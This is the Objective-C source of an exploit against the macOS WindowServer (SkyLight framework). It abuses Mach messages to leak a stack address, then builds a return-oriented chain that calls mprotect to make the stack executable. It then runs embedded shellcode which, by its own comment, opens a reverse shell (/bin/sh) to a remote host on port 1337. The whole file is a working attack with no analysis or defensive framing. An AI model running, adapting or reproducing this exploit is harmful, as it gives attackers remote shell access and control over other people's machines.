#import <CoreGraphics/CoreGraphics.h>
#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <mach-o/dyld.h>

#import "CGSInternal/CGSInternal.h"

#pragma pack(4)
typedef struct {
	mach_msg_header_t header;
	NDR_record_t NDR;
	int size;
	int dummy;
	int leak_addr;
} leak_msg_t;
typedef struct {
	mach_msg_header_t header;
	NDR_record_t NDR;
	int wid;
	int length;
} msg_t;
#pragma pack(0)

mach_port_t CGPort;
uint64_t CG_Base;
uint64_t mmapAddr;
void *funcptr = NULL;
uint64_t stack_addr = 0;
uint64_t libsystem_Base = 0;
unsigned int getport = 0;
CGSConnectionID conn;
CFMutableArrayRef array;

uint64_t mprotect_offset = 0x0000000000019948;

//160 byte
unsigned char shellcode[] = 
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //11
	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0\x0f\x05" //18
	"\x41\xB0\x02\x49\xC1\xE0\x18\x49\x83\xC8\x61\x4C\x89\xC0\x48" //15
	"\x31\xD2\x48\x89\xD6\x48\xFF\xC6\x48\x89\xF7\x48\xFF\xC7\x0F" //15
	"\x05\x49\x89\xC4\x49\xBD\x01\x01\x05\x39\x0d\x7c\x1b\x7e\x41" //15, PORT, IP 1337, 13.xx.xx.xx singi.kr
	"\xB1\xFF\x4D\x29\xCD\x41\x55\x49\x89\xE5\x49\xFF\xC0\x4C\x89" //15
	"\xC0\x4C\x89\xE7\x4C\x89\xEE\x48\x83\xC2\x10\x0F\x05\x49\x83" //15
	"\xE8\x08\x48\x31\xF6\x4C\x89\xC0\x4C\x89\xE7\x0F\x05\x48\x83" //15
	"\xFE\x02\x48\xFF\xC6\x76\xEF\x49\x83\xE8\x1F\x4C\x89\xC0\x48" //15
	"\x31\xD2\x49\xBD\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x49\xC1\xED" //15
	"\x08\x41\x55\x48\x89\xE7\x48\x31\xF6\x0F\x05"; //11

uint64_t shellcode_int_array[] = {
	0x9090909090909090,
	0xc14902b041c9314d,
	0xff3117c8834918e0,
	0x02b041050fc0894c,
	0x61c8834918e0c149,
	0x8948d23148c0894c,
	0x48f78948c6ff48d6,
	0x49c48949050fc7ff,
	0x1b7c0d39050101bd,
	0x41cd294dffb1417e,
	0x4cc0ff49e5894955,
	0xee894ce7894cc089,
	0x8349050f10c28348,
	0xc0894cf6314808e8,
	0xfe8348050fe7894c,
	0x8349ef76c6ff4802,
	0xd23148c0894c1fe8,
	0x2f6e69622fffbd49,
	0x554108edc1496873,
	0x050ff63148e78948
};

void setArray_highLow(uint64_t addr)
{
	int addr_low = addr & 0x00000000ffffffff;
	int addr_high = addr >> 32;
	CFNumberRef high,low;

	low = CFNumberCreate(NULL, 3, &addr_low);
	high = CFNumberCreate(NULL, 3, &addr_high);

	CFArrayAppendValue(array, low);
	CFArrayAppendValue(array, high);
}

void pwn()
{
	CGSRegionRef g;
	CGWindowID r[2] = {0};
	CGRect t = CGRectMake(-10,-10,10,10);
	CGRect tt = CGRectMake(-10,-10,20,20);	

	CGSNewRegionWithRect( NULL, &g);
	CGSNewWindow(conn, 2, 0, 0, g, &r[0]); //r9 will have windowID

	array = CFArrayCreateMutable(NULL, 0, NULL);

	NSLog(@"[+] set rwx/rwx %p\n", stack_addr & 0xfffffffffffff000);
	//4103 * 2 == 8206 == 0x200e
	setArray_highLow(0x4141414142424242); //dummy

	setArray_highLow(CG_Base + 0x0000000000044225); //0x0000000000044225 : pop rdi ; ret
	setArray_highLow(stack_addr & 0xfffffffffffff000); //mprotect 1st argument.
	setArray_highLow(CG_Base + 0x000000000000953f); //0x000000000000953f : pop rsi ; ret
	setArray_highLow(0x2000); //mprotect 2nd argument. must be page size.
	setArray_highLow(CG_Base + 0x000000000000aa5f); //0x000000000000aa5f : pop rdx ; ret
	setArray_highLow(0x7); //mprotect 3rd argument.
	setArray_highLow(libsystem_Base + mprotect_offset);
	setArray_highLow(stack_addr + 0x70); //after mprotect call, jump to shellcode.

	for(int i=0;i<20;i++)
		setArray_highLow(shellcode_int_array[i]);
	//28*2 

	for(int i=0;i<4103-29;i++)
		setArray_highLow(0x4141414142424242);

	setArray_highLow(CG_Base + 0x000000000000f3f4); //0x000000000000f3f4 : add rsp, 0x28 ; pop rbx ; pop rbp ; ret

	CFStringRef group = CFStringCreateWithBytes(NULL,  "movementGroup",  13,  kCFStringEncodingUTF8,  false );
	CGSSetWindowProperty(conn, r[0], group, array);
	
	mach_msg_return_t ret;
	msg_t message;

	mach_port_t replyPort = mig_get_reply_port();

	//go trigger the bug!
	memset(&message, 0, sizeof(message));
	message.header.msgh_remote_port = getport;
	message.header.msgh_local_port = replyPort;
	message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	message.header.msgh_size = 40;
	message.header.msgh_id = 0x7210 + 0xc8;

	message.NDR = NDR_record;
	message.wid = r[0];
	message.length = 0x2010;

	ret = mach_msg(&(message.header), MACH_SEND_MSG | MACH_RCV_MSG,
					40, 0xffff, replyPort,
					MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	
	if(ret != MACH_MSG_SUCCESS) {
		NSLog(@"mach_msg fail.\n");
		mach_error("mach_msg:" , ret);
	}

	CGSReleaseWindow(conn, r[0]);	
}

void leak_addr()
{	
	mach_msg_return_t ret;
	leak_msg_t message;
	mach_port_t replyPort = mig_get_reply_port();
	memset(&message, 0, sizeof(message));
	message.header.msgh_remote_port = getport;
	message.header.msgh_local_port = replyPort;
	message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	message.header.msgh_size = 36;
	message.header.msgh_id = 0x7210 + 0xff;
	message.NDR = NDR_record;
	message.size = 0;
	message.leak_addr = 0x1337; //if trigger leak bug successfully, it will be change to stack value.
	ret = mach_msg(&(message.header), MACH_SEND_MSG | MACH_RCV_MSG,
					36, 0xffff, replyPort,
					MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);

	if(ret != MACH_MSG_SUCCESS) {
		NSLog(@"mach_msg fail.\n");
		mach_error("mach_msg:" , ret);
	}
	stack_addr = 0x7fff00000000 | message.leak_addr;
}

void GetAddrFunctionName()
{
	uint32_t count = _dyld_image_count();	
	intptr_t slide;
	uint64_t offset = 0x2946f;

	const char *name;

	for (uint32_t i = 0; i < count; i++)
	{
		name = _dyld_get_image_name(i);
		if (strstr(name, "SkyLight")) {
			CG_Base = (uint64_t)_dyld_get_image_header(i);
			slide = _dyld_get_image_vmaddr_slide(i);
			funcptr = (void *)CG_Base + offset;
		}

		if (strstr(name, "libsystem_kernel.dylib")) {
			libsystem_Base = (uint64_t)_dyld_get_image_header(i);			
		}

		if(libsystem_Base != NULL && funcptr != NULL)
			break;
	}
}

int main(int argc, char *argv[])
{	
	CFMachPortRef portRef = CGWindowServerCreateServerPort();
	//Boolean isValid = CFMachPortIsValid(portRef);
	//mach_port_t port = CFMachPortGetPort(portRef);

	conn = CGSMainConnectionID();

	GetAddrFunctionName();
	NSLog(@"%p\n", funcptr);
	getport = ((int (*)(unsigned int))funcptr)(conn);

	leak_addr();
	NSLog(@"[+] leak address : %p\n", stack_addr);
	pwn();

	return 0;
}
